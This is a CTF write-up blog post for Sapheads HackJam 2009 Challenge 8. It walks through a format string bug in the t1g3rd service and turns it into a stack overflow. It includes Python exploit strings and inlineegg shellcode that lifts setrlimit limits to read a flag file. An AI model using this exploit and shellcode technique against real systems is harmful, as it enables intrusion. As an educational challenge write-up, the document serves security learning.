---
title: 'Writing neat shellcode using inlineegg &#8211; Sapheads HackJam 2009 Challenge 8'
author: thaidn
excerpt: |
  |
    Challenge 8 is a trivial format string bug, but one needs neat shellcode to get the flag.
layout: post

shorturls:
  - 'a:4:{s:9:"permalink";s:108:"https://www.vnsecurity.net/2009/10/writing-neat-shellcode-using-inlineegg-sapheads-hackjam-2009-challenge-8/";s:7:"tinyurl";s:26:"http://tinyurl.com/ya5wpdl";s:4:"isgd";s:18:"http://is.gd/aOt83";s:5:"bitly";s:20:"http://bit.ly/6aVAwT";}'
tweetbackscheck:
  - 1408358990
twittercomments:
  - 'a:0:{}'
tweetcount:
  - 0
category:
  - 'CTF - CLGT Crew'
---
## 1. Analysis

First thing first:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">$ file t1g3rd

t1g3rd:
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux
2.6.15, dynamically linked (uses shared libs), not stripped</pre>

t1g3rd is a regular network service that when executed would listen on port 7384. When a client comes in, the binary forks a new child process, and calls a function named handleClient. At the begining of handleClient, t1g3rd calls setrlimit(2) to disallow this child process to open new file or fork a new process. This makes the binary a perfect example to illustrate how to write neat shellcode using [inlineegg][1] :-D.

handleClient then goes on to read two inputs, which are 19 bytes long and 512 bytes long respectively, from the client. The first input is sent back to the client using printf(3), and the second is just discarded.

## 2. Vulnerability

As one can guess, the printf(3) call at 0x08048c52 that the binary uses to send the first input back to the client is vulnerable to format string attack. The format string is limited to 19 bytes long, so one needs to choose where to write with which value wisely.

## 3. Exploit 

Usually, with this kind of format string bug, one could overwrite the RIP of handleClient or the RIP of the vulnerable printf(3) call to loop back to the begining of handleClient, so that the binary would read(2) another 19 bytes, and the next printf(3) call would allow her to overwrite some more bytes to somewhere else such as a GOT entry. One could also redirect to right above the first read(2) call, so that it would read(2) more than 19 bytes, which in turn allows him to overwrite as many bytes to any where as he wants. But we don&#8217;t need to use these techniques here.

Right after the vulnerable printf(3) call is another read(2) call at 0x08048c7f whose pseudo-code looks like:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">read(0, input_buffer2, length)</pre>

where length is an integer stored at $EBP &#8211; 0&#215;228 on the stack. Before this call, at 0x08048b43, length is assigned a default value which is 512. What if we overwrite length so that it becomes 1000? Since input_buffer2 is just 512 bytes long, and we read(2) in 1000 bytes, we would get a classic stack-based buffer overflow.

Here are two exploit strings that we send to the binary:

<pre class="brush: python; gutter: false; title: ; notranslate" title=""># overwrite length so that read(0, input_buffer2, length) at 0x08048c7f reads more than 512 bytes
length_slot = 0xbf9c1978 #original length: 0x0000200
new_length = 1000
msg1 = struct.pack('I', length_slot) + '%' + str(new_length) + 'c%134$hn' # this is 18 bytes


# msg2 = SHELLCODE + RET
shellcode = SHELLCODE # shellcode's length should a multiple of 4
msg2 = shellcode + 'x84x19x9cxbf' * ((0x224 - len(msg2))/4) # 0xbf9c1984 = input_buffer2

</pre></p> 

## 4. Shellcode 

Now I can make t1g3rd run my shellcode, but as I said in Section 1, the binary disallows opening new file or forking new process. That means the shellcode can&#8217;t do anything useful, i.e. reading the key file or returning a shell. Or can it? What if our shellcode calls setrlmit(2) to set the resource limitations back to normal values?

Then comes the question of the day: how to write shellcode that calls setrlmit(2)? Or a more generic question: how to write shellcode that calls syscalls that accept structures as parameters? Actually, there are 3 ways to write that kind of shellcode: a) write it using Assembly; b) or write a C program, and use [ShellForge][2] to get out the respective shellcode; c) or use inlineegg to write it in Python.

As the title of this entry suggests, I&#8217;ll go with inlineegg. To be honest I hadn&#8217;t written this kind of shellcode before, so it took me an hour or so to figure out how to do it with inlineegg. This is just basic knowledge, but I hope somebody would find my work useful.

Here is the shellcode:

<pre class="brush: python; gutter: false; title: ; notranslate" title="">1.    egg = InlineEgg(Linuxx86Syscall)
2.    egg.addCode(egg.micro.pushTuple((100, 200)))
3.    egg.setrlimit(7, egg.micro.varAtTop().addr())    # RLIMIT_NOFILE
4.    buff = egg.alloc(20)
5.    fd = egg.save(-1)
6.    fd = egg.open(flag_file)
7.    nr = egg.read(fd, buff.addr(), 20)
8.    egg.write(0, buff.addr(), nr)
9.    #egg.execve('/bin/cat',('cat', flag_file)) # easier way
10.   egg.exit(0)</pre>

The most important lines are 2 and 3 which I would explain shortly. If you want to understand the rest, I suggest you reading inlineegg&#8217;s documetation and examples.

The prototype of setrlimit(2) is:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">int setrlimit(int resource, const struct rlimit *rlim); </pre>

where the second parameter is a pointer to a rlimit structure which is:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">struct rlimit {
 rlim_t rlim_cur;  /* Soft limit */
 rlim_t rlim_max;  /* Hard limit (ceiling for rlim_cur) */
};</pre>

So in order to call setrlimit(2), we need to pass to it an address that points to a rlimit structure containing more relaxing values of rlim\_cur and rlimit\_max.

At line 2, I push a tuple (100, 200) to the stack. egg.micro.pushTuple((100, 200)) would return the Assembly code that pushes 100 and 200 to the stack, and egg.addCode of course would add that code to the egg.

At line 3, egg.micro.varAtTop() would return the variable (see class Variable in inlineegg.py) at the top of the stack. Since we just push 100 and 200 to the stack, this variable would contain these two integers. I call addr() on this variable to get its address, and pass the result as the second argument of the setrlimit(2) syscall.

And that&#8217;s it! Is it neat? He he he. In the next writeup, I&#8217;ll illustrate how to use inlineegg to write even sneakier shellcode. Stay tuned and happy hacking!

 [1]: http://oss.coresecurity.com/projects/inlineegg.html
 [2]: http://www.secdev.org/projects/shellforge/